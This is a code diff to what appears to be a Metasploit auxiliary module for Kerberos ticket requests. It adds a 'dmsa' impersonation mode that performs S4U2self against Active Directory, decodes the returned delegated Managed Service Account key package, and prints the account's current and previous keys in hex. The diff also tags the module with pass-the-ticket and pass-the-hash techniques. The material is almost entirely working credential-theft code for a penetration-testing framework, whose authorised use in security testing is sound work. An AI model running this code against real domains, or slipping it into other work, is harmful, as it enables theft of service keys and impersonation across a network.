@@ -39,7 +39,11 @@ class MetasploitModule < Msf::Auxiliary
           [ 'GET_HASH', { 'Description' => 'Request a TGS to recover the NTLM hash' } ]
         ],
         'DefaultAction' => 'GET_TGT',
-        'AKA' => ['PKINIT']
+        'AKA' => ['PKINIT'],
+        'References' => [
+          ['ATT&CK', Mitre::Attack::Technique::T1550_003_PASS_THE_TICKET],
+          ['ATT&CK', Mitre::Attack::Technique::T1550_002_PASS_THE_HASH]
+        ]
       )
     )
 
@@ -50,6 +54,7 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('PASSWORD', [ false, 'The domain user\'s password' ]),
         OptPkcs12Cert.new('CERT_FILE', [ false, 'The PKCS12 (.pfx) certificate file to authenticate with' ]),
         OptString.new('CERT_PASSWORD', [ false, 'The certificate file\'s password' ]),
+        OptEnum.new('IMPERSONATE_TYPE', [true, 'The impersonation type to use when requesting a TGS', 'none', ['auto', 'generic', 'none', 'dmsa'], 'none']),
         OptString.new(
           'NTHASH', [
             false,
@@ -133,6 +138,10 @@ class MetasploitModule < Msf::Auxiliary
     if datastore['SPN'].present? && !datastore['SPN'].match(%r{.+/.+})
       fail_with(Failure::BadConfig, 'SPN format must be service_name/FQDN (ex: cifs/dc01.mydomain.local)')
     end
+
+    if datastore['IMPERSONATE'].present? && datastore['IMPERSONATE_TYPE'] == 'none'
+      fail_with(Failure::BadConfig, 'IMPERSONATE_TYPE must be set to "generic", "dmsa" or "auto" when IMPERSONATE is provided')
+    end
   end
 
   def run
@@ -204,7 +213,43 @@ class MetasploitModule < Msf::Auxiliary
     end
     credential = authenticator.request_tgt_only(tgt_request_options)
 
-    if datastore['IMPERSONATE'].present?
+    if datastore['IMPERSONATE_TYPE'] == 'dmsa'
+      print_status("#{peer} - Getting TGS impersonating #{datastore['IMPERSONATE']}@#{@realm} (SPN: #{datastore['SPN']})")
+
+      sname = Rex::Proto::Kerberos::Model::PrincipalName.new(
+        name_type: Rex::Proto::Kerberos::Model::NameType::NT_SRV_INST,
+        name_string: [
+          'krbtgt',
+          @realm
+        ]
+      )
+
+      nonce = rand(0..0x7FFFFFFF)
+      auth_options = {
+        sname: sname,
+        nonce: nonce,
+        impersonate: datastore['IMPERSONATE'],
+        impersonate_type: datastore['IMPERSONATE_TYPE']
+      }
+      tgs_ticket, tgs_auth, tgs_credential = authenticator.s4u2self(
+        credential,
+        auth_options.merge(ticket_storage: kerberos_ticket_storage(read: false, write: true))
+      )
+
+      tgs_auth.pa_data.each do |pa_data|
+        if pa_data.type == Rex::Proto::Kerberos::Model::PreAuthType::DMSA_KEY_PACKAGE
+          dmsa_key_package = Rex::Proto::Kerberos::Model::DmsaKeyPackage.decode(pa_data.value)
+          print_dmsa_key_package_info(dmsa_key_package)
+        end
+      rescue ::Rex::Proto::Kerberos::Model::Error::KerberosDecodingError => e
+        print_error("#{peer} - Failed to decode dMSA Key Package: #{e.message}")
+        next
+      end
+
+      auth_options[:tgs_ticket] = tgs_ticket
+      auth_options[:credential] = tgs_credential
+      auth_options
+    elsif datastore['IMPERSONATE_TYPE'] == 'generic'
       print_status("#{peer} - Getting TGS impersonating #{datastore['IMPERSONATE']}@#{@realm} (SPN: #{datastore['SPN']})")
 
       sname = Rex::Proto::Kerberos::Model::PrincipalName.new(
@@ -233,12 +278,36 @@ class MetasploitModule < Msf::Auxiliary
         name_type: Rex::Proto::Kerberos::Model::NameType::NT_SRV_INST,
         name_string: datastore['SPN'].split('/')
       )
+      nonce = rand(0..0x7FFFFFFF) # nonce should be a signed 32-bit integer
       tgs_options = {
         sname: sname,
+        nonce: nonce,
         ticket_storage: kerberos_ticket_storage(read: false)
       }
 
       authenticator.request_tgs_only(credential, tgs_options)
+    end
+  end
+
+  def print_dmsa_key_package_info(dmsa_key_package)
+    print_status('dMSA Key Package:')
+
+    print_status('  Current Keys:')
+    dmsa_key_package.current_keys.each do |key_set|
+      key_set.each do |key|
+        type = Rex::Proto::Kerberos::Crypto::Encryption::IANA_NAMES[key[0][0]] || 'unknown'
+        value = key[1][0]
+        print_good("    Type: #{type}, Key: #{value.unpack1('H*')}")
+      end
+    end
+
+    print_status('  Previous Keys:')
+    dmsa_key_package.previous_keys.each do |key_set|
+      key_set.each do |key|
+        type = Rex::Proto::Kerberos::Crypto::Encryption::IANA_NAMES[key[0][0]] || 'unknown'
+        value = key[1][0]
+        print_good("    Type: #{type}, Key: #{value.unpack1('H*')}")
+      end
     end
   end
 
